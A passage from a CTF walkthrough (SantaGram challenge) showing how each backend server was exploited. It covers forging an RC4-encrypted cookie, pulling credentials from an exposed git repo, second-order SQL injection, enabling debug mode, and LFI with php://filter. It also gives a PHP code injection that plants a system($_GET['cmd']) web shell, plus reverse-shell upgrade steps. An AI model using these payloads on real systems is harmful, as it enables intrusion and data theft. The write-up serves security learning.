@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<title>Part 4</title>
+
+	<link rel="stylesheet" href="../css/main.css">
+	<link rel="canonical" href="http://yourdomain.com/part-4/">
+	<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,700,800,600' rel='stylesheet' type='text/css'>
+	<link href='https://fonts.googleapis.com/css?family=Muli:400,300' rel='stylesheet' type='text/css'>
+
+</head> 
+
+
+<body>
+	<aside>
+	<div class="container">
+		<nav>
+			<ul>
+				   
+				<li><a href="../">Answers</a></li>
+				    
+				<li><a href="../part-1/">Part 1</a></li>
+				  
+				<li><a href="../part-2/">Part 2</a></li>
+				  
+				<li><a href="../part-3/">Part 3</a></li>
+				  
+				<li><a href="../part-4/">Part 4</a></li>
+				  
+				<li><a href="../part-5/">Part 5</a></li>
+				  
+				<li><a href="../tokens/">Tokens</a></li>
+				  
+				<li><a href="../android-install/">Android</a></li>
+				  
+				<li><a href="../elf-chat/">Elf Chat</a></li>
+				 
+			</ul>
+		</nav>
+	</div>
+</aside>
+
+<header>
+	<h1><a href="">Part 4</a></h1>
+</header>
+
+	<main>
+		<article>
+			    <aside2>
+  <div class="container2">
+    <nav>
+      <ul>
+        <li>
+          <li><a href="#analytics">Analytics</a></li>
+          <li><a href="#debug">Debug</a></li>
+          <li><a href="#ad">Ads</a></li>
+          <li><a href="#exception">Exception</a></li>
+          <li><a href="#dungeon">Dungeon</a></li>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</aside2>
+
+<h1 id="exploiting-each-of-the-services">7. Exploiting Each of the Services.</h1>
+
+<p>All of the services we can exploit are contained within the APK.  This is hinted at by the zip containing the word “bugbounty”, it would appear that SantaGram has a public bug bounty program and the scope is almost everything within the application.  If there ever is any question to whether something is in scope or not, you can locate Tom Hessman in game, enter an IP Address in the chat box and he will let you know if it is in scope.  In order to find the URL’s, I disassembled the APK with <code class="highlighter-rouge">apktool d SantaGram_v4.2.apk</code>.  I chose the disassembly route over the decompile route this time because the smali code has very little information per line, which translate to less noise.  Once the app was decompiled, pulling URL’s was done by running <code class="highlighter-rouge">grep -r -i northpolewonderland.com .</code></p>
+
+<p><img src="../assets/part-4/hostnames.png" alt="hostnames" /></p>
+
+<p>The servers we will need to exploit are:</p>
+
+<ul>
+  <li>Mobile Analytics Server: analytics.northpolewonderland.com</li>
+  <li>Dungeon Game: dungeon.northpolewonderland.com</li>
+  <li>Debug Server: dev.northpolewonderland.com</li>
+  <li>Banner Ad Server: ads.northpolewonderland.com</li>
+  <li>Uncaught Exception Handeling: ex.northpolewonderland.com</li>
+</ul>
+
+<p><a name="analytics" class="jumptarget"></a></p>
+
+<h1 id="the-mobile-analytics-server">The Mobile Analytics Server</h1>
+
+<p>The first finding in this application is that you can enumerate usernames via the login response.  Attempting to login with <em>admin</em> returns <em>No Such user</em> but <em>administrator</em> or <em>guest</em> will return <em>Invalid username\/password</em>.  The Android APK had a guest account hardcoded with the password busyreindeer78, which let me login and grab the first audio file.
+<img src="../assets/part-4/sprusage-1.png" alt="Sprusage" /></p>
+
+<p>The guest is allowed to create and run reports, but I wasn’t able to do any useful exploitation beyond creating a non-informative database error.  The oddest thing is that the cookie you get upon login is called <em>AUTH</em> and doesn’t appear follow a standard convention.  I ran Burp Sequencer to generate a few hundred AUTH Cookies, and noticed there was very little entropy – there were duplicate cookies and the ones that did vary only varied by ~2 bytes.</p>
+
+<p>This lead me to believe the first chunk of the cookie which did not change held an either encrypted or encoded form of my username.  Additionally, due to a portion of the cookie changing in the middle and the end remaining static it does not appear the cookie was signed. So I tried the CBC Bit Flipping attack, which has a good chance of being successful if either the username or group is stored as an integer.</p>
+
+<p>Unfortunately, this test wasn’t a complete success but it’s still a cool attack to try.  Later tests, reveal that it is our entire username that gets encrypted and no amount of bit flips will change “guest” to “administrator”.</p>
+
+<p>To perform the attack:</p>
+
+<ol>
+  <li>
+    <p>Intercept a request in burp, then right click and select send to sequencer.
+<img src="../assets/part-4/sprusage-2.png" alt="Sprusage" /></p>
+  </li>
+  <li>
+    <p>Go to the Sequencer Tab, Make sure the token Location is the AUTH token.  Then hit Start live capture.
+<img src="../assets/part-4/sprusage-3.png" alt="Sprusage" /></p>
+  </li>
+  <li>
+    <p>Let this run for about a minute then hit stop.  You can look at the graphs and different tests it runs… Or just save tokens to a text file.
+<img src="../assets/part-4/sprusage-4.png" alt="Sprusage" /></p>
+  </li>
+  <li>
+    <p>If you saved the token, it would become very apparent there is little variation between tokens when viewing the file. The command i used was <code class="highlighter-rouge">sort token.txt | uniq -c | less</code>
+<img src="../assets/part-4/sprusage-5.png" alt="Sprusage" /></p>
+  </li>
+</ol>
+
+<p>Again, this test was not successful as we did not change our privileges.  However, it is not a failure as we know the application handles sessions insecurely… Perhaps we’ll find another vulnerability where this will knowledge will allow us to chain vulnerabilities.</p>
+
+<h3 id="analytics---further-enumeration-and-source-code-disclosure">Analytics - Further Enumeration and Source Code Disclosure.</h3>
+
+<p>With only guest access and no web exploits its back to the drawing board.  The next step was to nmap all the ports with <code class="highlighter-rouge">nmap -sC -A -p- analytics.northpolewonderland.com</code>.  My initial hope was that I’d find an alternative web interface or exposed mongo database.  However, we found something even better an exposed GIT Repository which contains all the source code!
+<img src="../assets/part-4/sprusage-6.png" alt="Sprusage" /></p>
+
+<ol>
+  <li>We can download the entire git repo with <code class="highlighter-rouge">wget -m https://analytics.northpolewonderland.com/.git/</code>.</li>
+  <li>Obtain the source code by checking out the latest commit via <code class="highlighter-rouge">git reset --hard</code> from inside the analytics.northpolewonderland.com folder (created by wget).</li>
+  <li>Analyze the source code, by looking at crypto.php we can see that it uses a RC4 Cipher to encrypt the cookie (indicated by MCRYPE_ARCFOUR).
+    <div class="language-php highlighter-rouge"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+  <span class="nb">define</span><span class="p">(</span><span class="s1">'KEY'</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc</span><span class="s2">"</span><span class="p">);</span>
+  <span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+   <span class="k">return</span> <span class="nb">mcrypt_encrypt</span><span class="p">(</span><span class="nx">MCRYPT_ARCFOUR</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">'stream'</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+   <span class="k">return</span> <span class="nb">mcrypt_decrypt</span><span class="p">(</span><span class="nx">MCRYPT_ARCFOUR</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">'stream'</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table>
+</code></pre>    </div>
+  </li>
+  <li>Find out where the encrypt function is used by running <code class="highlighter-rouge">grep -i encrypt .</code> – Turns out it is used in login.php to create the cookie.
+    <div class="language-php highlighter-rouge"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+ <span class="nv">$auth</span> <span class="o">=</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">([</span>
+   <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span>
+   <span class="s1">'date'</span> <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="nx">DateTime</span><span class="o">::</span><span class="na">ISO8601</span><span class="p">),</span>
+ <span class="p">]));</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table>
+</code></pre>    </div>
+  </li>
+  <li>The source above, shows the username is hardcoded in the session.  Run the encrypt function against the above code with the exception of hardcoding username to be administrator.</li>
+  <li>Within your webbrowser replace the cookie with the administrator one just generated.</li>
+</ol>
+
+<script type="text/javascript" src="https://asciinema.org/a/dotala39v3xh0o8h2bgb81uuk.js" id="asciicast-dotala39v3xh0o8h2bgb81uuk" async=""></script>
+
+<h3 id="analytics---second-way-to-get-administrator">Analytics - Second Way to Get Administrator</h3>
+
+<p>Git Repositories contain all versions of code, we only checked out the latest commit.  If we extract all the commits, we can find a version of code that had credentials hard coded.  This gives the administrator password (KeepWatchingTheSkies) and an older version of the guest password (busyllama78).  Here is how I did it:</p>
+
+<ol>
+  <li>Check the commit log to see if there are any other versions of code within the repository we downloaded <code class="highlighter-rouge">git log</code></li>
+  <li>Create a new directory and copy our .git repository into that directory.  This isn’t needed but helps us stay organized. <code class="highlighter-rouge">mkdir commits; cp -r .git commits</code></li>
+  <li>Loop through the git log output, pulling out all commits, and creating a directory for each one: <code class="highlighter-rouge">git log | grep commit | awk '{print $2}' | xargs mkdir</code></li>
+  <li>Checkout (Pull) the code for every commit and place it into the corresponding commit folder. <code class="highlighter-rouge">for i in $(ls); do git --work-tree=./$i reset --hard; done</code></li>
+  <li>Grep for interesting data.  <code class="highlighter-rouge">grep -i -r 'administrator\|password\|guest'</code></li>
+</ol>
+
+<p>This mistake is a lot more common than you would think.  Last year a <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">Jamie Brown</a> (security researcher) determined 2,402 sites out of Alexa’s top 1.5million had their git repository exposed.  That’s 1 in 600 websites!  And I’m going to assume if he checked other version control systems (such as svn) he would of gotten a few more hits.</p>
+
+<p>Want to know more?</p>
+<ul>
+  <li>Here’s good writeup on <a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">git for pentesters</a></li>
+  <li>Not git related, but here’s a <a href="https://avicoder.me/2016/07/22/Twitter-Vine-Source-code-dump/">fantastic tale</a> on Vine exposing their source code via docker.</li>
+</ul>
+
+<script type="text/javascript" src="https://asciinema.org/a/6s525vvnrdab7293s08p9q5qz.js" id="asciicast-6s525vvnrdab7293s08p9q5qz" async=""></script>
+
+<h3 id="analytics---the-sql-injection">Analytics - The SQL Injection</h3>
+
+<p>This is a hard bug to track down and even harder one to ELI5.  Essentially, there are two bugs that when combined allow the administrator user to run any sql query.  The first issue is called “Mass Assignment” which essentially is when a user has access to a variable that the developer did not intend for.  The application allows anyone to save their reports, but the report isn’t actually archived.  Instead it just saves the information needed to regenerate the report which is $name, $description, and $query.  The edit.php page has a form for changing the $name and $description of a report, but a manipulated request can also change the $query.</p>
+
+<p><img src="../assets/part-4/sprusage-7.png" alt="Sprusage" /></p>
+
+<p>But the code in edit.php has a crucial bug that will also update $query if the user sends it.  Essentially, it loops through every column in the SQL Table <em>reports</em> and if it has a corresponding $_GET Variable for that column it will place that in the query.  The code which is responsible is below:</p>
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">print</span> <span class="s2">"Checking for "</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"...&lt;br&gt;"</span><span class="p">;</span>
+      <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$name</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s1">'Yup!&lt;br&gt;'</span><span class="p">;</span>
+        <span class="nv">$set</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"`</span><span class="nv">$name</span><span class="s2">`='"</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"'"</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"UPDATE `reports` "</span> <span class="o">.</span>
+      <span class="s2">"SET "</span> <span class="o">.</span> <span class="nb">join</span><span class="p">(</span><span class="nv">$set</span><span class="p">,</span> <span class="s1">', '</span><span class="p">)</span> <span class="o">.</span> <span class="s1">' '</span> <span class="o">.</span>
+      <span class="s2">"WHERE `id`='"</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"'"</span><span class="p">;</span>
+    <span class="k">print</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table>
+</code></pre></div>
+<p>The issue is also shown in the above screenshot, but without looking at the code it isn’t immediately apparent.  For every column in the database, it will print “<em>Checking $ColumnName</em>” and if there is a corresponding $_GET parameter it will print “Yup!”.  When it gets to “Query” it doesn’t print Yup! but it does print the next thing outside of the loop which is the actual query.  At a quick glance, you may think that it is asking the user to validate the query looks good.</p>
+
+<p>But when looking at it programatically, you know that if the user sends the variable $query in the form of a $_GET request, then it add it to the SQL Update Query to the Report Table.  The Developer doesn’t allow the user to pass $query via the web form, but if the user edits the HTTP Request to include that variable they can control an internal variable that the developer did not account for.  This is the “Mass Assignment” vulnerability and is more common than you would think.  It’s affected <a href="https://gist.github.com/peternixey/1978249">github back in 2012</a> and was a critical vulnerability <a href="https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html">Joomla Core</a> in 2016, allowing people to set their group membership upon registration.  This allowed unauthenticated users to gain administrator access, even if registration was turned off!</p>
+
+<p>Manually send a $query variable to edit.php by just appending it to the url (ex: https://analytics.northpolewonderland.com/edit.php?id=c3813cc8-44dd-4246-9c67-149f98bd7fd7&amp;name=test&amp;description=test<strong>&amp;query=select+version()</strong>), then the SQL Update command the server would generate is:</p>
+
+<div class="language-sql highlighter-rouge"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="k">UPDATE</span> <span class="nv">`reports`</span> <span class="k">SET</span> <span class="nv">`id`</span><span class="o">=</span><span class="s1">'c3813cc8-44dd-4246-9c67-149f98bd7fd7'</span><span class="p">,</span>
+  <span class="nv">`name`</span><span class="o">=</span><span class="s1">'test'</span><span class="p">,</span> 
+  <span class="nv">`description`</span><span class="o">=</span><span class="s1">'test'</span><span class="p">,</span> 
+  <span class="nv">`query`</span><span class="o">=</span><span class="s1">'select version()'</span> 
+<span class="k">WHERE</span> <span class="nv">`id`</span><span class="o">=</span><span class="s1">'c3813cc8-44dd-4246-9c67-149f98bd7fd7'</span> 
+</pre></td></tr></tbody></table>
+</code></pre></div>
+
+<p>Remember, the “saved report” doesn’t save the actual report – it just saves the SQL Query which generated the report.  So by when accessing the report for: <em>c3813cc8-44dd-4246-9c67-149f98bd7fd7</em>, it would execute the SQL Query we placed.  This type of attack is called “Second Order SQL Injection”, as the injection doesn’t occur until a second condition is met (navigating to the report).  This is one of those vulnerabilities that many automated webscanners miss, but pentesters can spot especially when doing static code analysis.</p>
+
+<p>Anyways, our goal is to get the audio, so I changed the query to become <em>select+</em>+from+audio*, and when going to the corresponding report page I see the contents of the table audio.</p>
+
+<p><img src="../assets/part-4/sprusage-8.png" alt="Sprusage" /></p>
+
+<p>The final odd thing about this application is that it stores the MP3 file inside the database, I had expected it to just contain a link to where the file is on the filesystem.  We can extract it by running the query <em>select+hex(mp3)+from+audio+limit+1,1</em>.</p>
+
+<p>Then saved a copy of the page, removed all the HTML out so it is just the hex, and ran <code class="highlighter-rouge">xxd -r -p audio.hex &gt; audio.mp3</code> against the file.</p>
+
+<script type="text/javascript" src="https://asciinema.org/a/834wseixh1r46c6k79d0xawb4.js" id="asciicast-834wseixh1r46c6k79d0xawb4" async=""></script>
+
+<iframe width="420" height="315" src="http://www.youtube.com/embed/zcJyhDC9kgo" frameborder="0" allowfullscreen=""></iframe>
+
+<p><a name="debug" class="jumptarget"></a></p>
+
+<h1 id="the-debug-server-dev">The Debug Server (Dev)</h1>
+
+<p>This challenge requires us to have a working android device that is configured to go through Burp Proxy.  If you do not have this, I created a basic guide here at how I got it working with regular version of Kali.</p>
+
+<p>The question wanted us to find a flag on a debug server, so I went back to the APK folder which apktool created (smali code) and ran <code class="highlighter-rouge">grep -r -i debug .</code> to find all references for debug within the apk.  The file /res/values/strings.xml had a very interesting line which stated that debug_data_enabled = false.  I modified this value to be true and recompiled + signed the apk.  The steps are below</p>
+
+<ol>
+  <li>Build the apk with <code class="highlighter-rouge">apktool b SantaGram_4.2</code>, it will place the apk in SantaGram_4.2/dist.</li>
+  <li>Create a directory to store your keys with: <code class="highlighter-rouge">mkdir keys</code></li>
+  <li>Generate your keystore <code class="highlighter-rouge">keytool -genkey -v -keystore keys/santagram.keystore -alias SantaGram -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 1000</code></li>
+  <li>Enter a password and SSL Certificate Information when prompted.</li>
+  <li>Sign the apk with: <code class="highlighter-rouge">jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore keys/santagram.keystore dist/SantaGram_4.2.apk SantaGram</code></li>
+  <li>Push the adb to your phone with /usr/share/android-sdk/platform-tools/adb install dist/SantaGram_4.2.apk</li>
+</ol>
+
+<script type="text/javascript" src="https://asciinema.org/a/0kfe866pm9i3473foqape42iq.js" id="asciicast-0kfe866pm9i3473foqape42iq" async=""></script>
+
+<p>We should now have a developer version of SantaGram on our Android Phone, which is configured to go through BurpSuite running on our Kali Box.  Which means we can start poking at the traffic between the App and Server.  After editing my profile, I noticed a request go off to dev.northpolewonderland.com.  The response of this request told us verbose was set to false.  So I appended <code class="highlighter-rouge">"verbose":true</code> to my request and it responded with the location of the audio file.  Walkthrough below:</p>
+
+<ol>
+  <li>In Burpsuite add <code class="highlighter-rouge">\.northpolewonderland\.com$</code> to the scope.
+<img src="../assets/part-4/dev-1.png" alt="Dev" /></li>
+  <li>Go to the SiteMap tab, click filter, and check the box to show only in-scope items.
+<img src="../assets/part-4/dev-2.png" alt="Dev" /></li>
+  <li>Start playing around with the SantaGram application, you should see the sitemap start populating.</li>
+  <li>When a request to dev.northpolewonderland.com shows up click the request and send it over to repeater.<br />
+<img src="../assets/part-4/dev-3.png" alt="Dev" /></li>
+  <li>Send the request by clicking the “Go” button to see the response.  Notice at the end of the JSON String, it tells us Verbose is set to false.
+<img src="../assets/part-4/dev-4.png" alt="Dev" /></li>
+  <li>Add <code class="highlighter-rouge">"Verbose":True</code> to our request and send it off to get some extra information including the audio file!
+<img src="../assets/part-4/dev-5.png" alt="Dev" /></li>
+</ol>
+
+<p>It isn’t uncommon for developers to have hidden functions hidden within their public applications.  Randy Westergren, <a href="https://randywestergren.com/how-i-cracked-trivia-crack/">posted an article</a> talking about how he enabled the “ANSWER_CHEAT” mode in the mobile game Trivia Crack by disassembling the app, modifying a variable, then packaging it back up in apk form.  Think exploiting mobile doesn’t return big findings?  The same researcher also has several postings about mobile flaws in Verizon’s Mobile API that lead to <a href="https://randywestergren.com/critical-vulnerability-verizon-mobile-api-compromising-user-email-accounts/">compromising email accounts</a> or just <a href="https://randywestergren.com/multiple-vulnerabilities-in-verizons-fios-mobile-api-exposing-customer-information/">viewing private customer data</a>.  The funny thing?  Apparently <a href="https://randywestergren.com/reverse-engineering-the-subway-android-app/">Subway</a> and <a href="https://randywestergren.com/reverse-engineering-the-yik-yak-android-app/">Yik-Yak</a> takes their mobile app security very seriously (not sarcasm).</p>
+
+<iframe width="420" height="315" src="http://www.youtube.com/embed/fcemTQaosOQ" frameborder="0" allowfullscreen=""></iframe>
+
+<p><a name="ad" class="jumptarget"></a></p>
+
+<h1 id="ad-server">Ad Server</h1>
+
+<p>Browsing to ads.northpolewonderland.com, revealed a website and looking at the HTML Source showed it was running Meteor.  In the game, Shinny Uptree, told us a little bit about Meteor and suggested we install the Tamper Monkey Script for it.  This is a pretty straightforward process; the only caveat is you may need to download a newer version of firefox.  Kali comes with the “Extended Service Release” edition, which is not compatible with Tamper Monkey.  Once you have Tamper Monkey and the Meteor Miner plugin installed, browsing to the ad server will pop up a new box which aids you in dumping sensitive information.</p>
+
+<p><strong>Setup Firefox + Tamper Monkey</strong></p>
+<ol>
+  <li>Download <a href="https://www.mozilla.org/en-US/firefox/new/?scene=2">Firefox</a>.</li>
+  <li>Close Firefox, and extract the file which was downloaded.</li>
+  <li>Open the folder and doubleclick “firefox-bin”.</li>
+  <li>Download and install <a href="https://addons.mozilla.org/en-US/firefox/addon/tampermonkey/">tampermonkey</a> add on.</li>
+  <li>Click the Tamper Monkey icon, it should be to the right of where the “Home Button” is.</li>
+  <li>Select Create New Script.</li>
+  <li>In a new tab, go to the Meteor Miner <a href="https://github.com/nidem/MeteorMiner">github</a> page.</li>
+  <li>Click MeteorMiner.js, then select Raw.  Copy all of the text and paste it into the TamperMonkey.</li>
+  <li>Copy the Github Raw URL, and paste that into the TamperMonkey Create Script window as the update url.</li>
+  <li>Click the save button.</li>
+</ol>
+
+<p><strong>Mining the Ad Server.</strong></p>
+
+<ol>
+  <li>Navigating to ads.northpolewonderland.com brings up the meteor miner information.  The /admin/quotes page looks interesting.
+<img src="../assets/part-4/ad-meteor-1.png" alt="Meteor" /></li>
+  <li>We get an access denied when browsing to: /admin/quotes, but Meteor Miner tells us it can now see 5 records in the “HomeQuotes” collection (the last page only revealed 4).</li>
+  <li>Dump the records by opening Firebug, going to the Console Pane and running the query: <code class="highlighter-rouge">HomeQuotes.find().fetch()</code>
+<img src="../assets/part-4/ad-meteor-2.png" alt="Meteor" /></li>
+  <li>Click on the last object (“Just Ad It!”), to bring the DOM Inspector up allowing us to see all the variables including a link to the audio file.
+<img src="../assets/part-4/ad-meteor-3.png" alt="Meteor" /></li>
+</ol>
+
+<iframe width="420" height="315" src="http://www.youtube.com/embed/5UZy8OdqA4o" frameborder="0" allowfullscreen=""></iframe>
+
+<p><a name="exception" class="jumptarget"></a></p>
+
+<h1 id="exception-handling-server">Exception Handling Server</h1>
+
+<p>When SantaGram encounters an internal error, it automatically sends some information over to the exception handling server.  This crashdump gets written to the server with a .php extension.  Additionally, the php script which writes the crashdump is vulnerable to LocalFileInclusion which allows us view the source to the crashdump file. Due to the crashdump file being a php script, this allows us to craft a dump which will cause remote code execution.</p>
+
+<ol>
+  <li>Get an Android VM and Burpsuite running, just like in dev and ads.</li>
+  <li>Play around with the app until you see a request in Burp go to the exception handling server.  Mine got sent when adding a friend.
+<img src="../assets/part-4/ex-1.png" alt="Exception" /></li>
+  <li>Send the request to repeater and examing the ouput, I noticed the directory it write to and the filename.</li>
+  <li>Play around with the parameters, “Operation: WriteCrashDump” looked interesting.  I erased WriteCrashDump from my request, leaving it to be “Operation”:””.  This returned an error message stating there was a “ReadCrashDump” parameter.
+<img src="../assets/part-4/ex-2.png" alt="Exception" /></li>
+  <li>Sending Operation:ReadCrashDump, told us we also need the parameter “CrashDump”
+<img src="../assets/part-4/ex-3.png" alt="Exception" /></li>
+  <li>I did what the error message stated and crafted the JSON Request: <code class="highlighter-rouge"><span class="p">{</span><span class="nt">"operation"</span><span class="p">:</span><span class="s2">"ReadCrashDump"</span><span class="p">,</span><span class="nt">"data"</span><span class="p">:{</span><span class="nt">"crashdump"</span><span class="p">:</span><span class="s2">"docs/crashdump-UZilrv.php"</span><span class="p">}}</span></code>, which returned a “Duplicate php extesion”.  So I removed the php extension from my request and got the dump file.</li>
+  <li>I used PHP Filters to convert the crashdump to base64, which would allow me to view the source of the crash dump. <code class="highlighter-rouge"><span class="p">{</span><span class="nt">"operation"</span><span class="p">:</span><span class="s2">"ReadCrashDump"</span><span class="p">,</span><span class="nt">"data"</span><span class="p">:{</span><span class="nt">"crashdump"</span><span class="p">:</span><span class="s2">"php://filter/convert.base64-encode/resource=crashdump-UZilrv"</span><span class="p">}}</span></code>.  The response was along the lines of:
+    <div class="language-php highlighter-rouge"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre> <span class="cp">&lt;?php</span> <span class="k">print</span><span class="p">(</span><span class="s1">'{
+   "message": "Index: 0, Size: 0",
+   "lmessage": "Index: 0, Size: 0",
+   "model": "Android SDK built for x86",
+   "sdkint": "25",
+   "device": "generic_x86",
+ }'</span><span class="p">);</span>
+</pre></td></tr></tbody></table>
+</code></pre>    </div>
+  </li>
+  <li>The Crashdump does <code class="highlighter-rouge">print({'$userinput'});</code>, so if our crashdump can write close off the print statement we should be able to inject code after.  So if we wrote <code class="highlighter-rouge">}');phpinfo();print('{</code> to the crashdump should look like:
+    <div class="language-php highlighter-rouge"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>  <span class="cp">&lt;?php</span> <span class="k">print</span><span class="p">(</span><span class="s1">'{}'</span><span class="p">);</span>
+ <span class="nb">phpinfo</span><span class="p">();</span>
+ <span class="k">print</span><span class="p">(</span><span class="s1">'{}'</span><span class="p">);</span>
+  <span class="cp">?&gt;</span>
+</pre></td></tr></tbody></table>
+</code></pre>    </div>
+  </li>
+  <li>The above is not formatted as a JSON Query (ex: {“variable”:”contents”}) and will get rejected by the webserver.  To get around this I formatted the contents of my request to still appear as valid json (ex: <code class="highlighter-rouge"><span class="p">{</span><span class="nt">"operation"</span><span class="p">:</span><span class="s2">"WriteCrashDump"</span><span class="p">,</span><span class="nt">"data"</span><span class="p">:{</span><span class="nt">"}');phpinfo();print('{"</span><span class="p">:</span><span class="s2">""</span><span class="p">}}</span></code>.</li>
+  <li>Then when navigating to the crashdump the above request makes, I get the phpinfo page!  Note:  I generally use phpinfo before attempting any type of shell, due to it having a higher probability of working and giving some valuable information.  There is a chance a shell will silently fail due to PHP Configuration, SELinux, etc. which may cause me to overlook a critical vulnerability.  So if phpinfo() works and system() does not, I will avoid system calls and start writing my exploits purely in php.</li>
+  <li>Now that code injection is verified lets try dropping a shell that will allow us to run shell commands: <code class="highlighter-rouge"><span class="p">{</span><span class="nt">"operation"</span><span class="p">:</span><span class="s2">"WriteCrashDump"</span><span class="p">,</span><span class="nt">"data"</span><span class="p">:{</span><span class="nt">"}');echo system($_GET['cmd']);print('{"</span><span class="p">:</span><span class="s2">""</span><span class="p">}}</span></code>.</li>
+  <li>My shell was now uploaded to: docs/crashdump-4W9V7e.php – so browsing to http://ex.northpolewonderland.com/docs/crashdump-4W9V7e.php?cmd=ls resulting in an ls being ran.</li>
+  <li>I found the mp3 by replacing ls with <code class="highlighter-rouge">find+/+-name+*.mp3</code>, turns out the mp3 file was within the http directory.
+<img src="../assets/part-4/ex-4.png" alt="Exception" /></li>
+</ol>
+
+<p>PHP Filters can also be used to attack file upload forms.  The 2016 Plaid CTF ran a similiar challenge where you used php filters to upload code to the <a href="https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/web_pixelshop">“Web Pixel Shop”</a>.  Additionally, SecureUsGlobal ran a file upload challenge (PandaUploader) and put out a great <a href="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/">write-up</a>.  Unfortunately, they took down their web application and didn’t post the source code.</p>
+
+<h2 id="exception----shell-it">Exception – Shell It!</h2>
+
+<p>The above example just has us running system commands one at a time, which is very slow and makes it difficult to obtain a proper TTY which allows us to run commands such as sudo/su/etc.  My favorite reverse php shell comes from PentestMonkey.net and is conveniently located on Kali at /usr/share/webshells/php/php-reverse-shell.php.  It should also be noted that reverse shells do require a route-able IP Address, if you don’t have one just spin up an Amazon EC2 Micro Instance.  But if you don’t want to do that, feel free to use something like Weevely to get a “shell like” interface.</p>
+
+<p>In order to get shells, we need to ensure our payload remains to be a valid JSON.  One of the troublesome characters that will break this is a single quote.  I got around this by just base64 encoding my webshell then putting an eval(base64_decode(‘<strong>base64-encoded-payload-here</strong>’)).  I highly recommend watching the video, as I demo a technique to fix the TTY Enough to restore hotkey functions in a reverse shell.  The steps I use to do this are:</p>
+
+<ol>
+  <li>Get Reverse Shell</li>
+  <li>python -c ‘import pty; pty.spawn(“/bin/bash”)’</li>
+  <li>Background the shell via Ctrl+Z</li>
+  <li>Tell your terminal to not do any “Special Processing” <code class="highlighter-rouge">stty raw -echo</code></li>
+  <li>Bring the Reverse Shell back by entering the command <code class="highlighter-rouge">fg</code>. Note: Because of the -echo, you will not see yourself typing fg</li>
+  <li>Should have an upgraded shell that supports all hotkeys.</li>
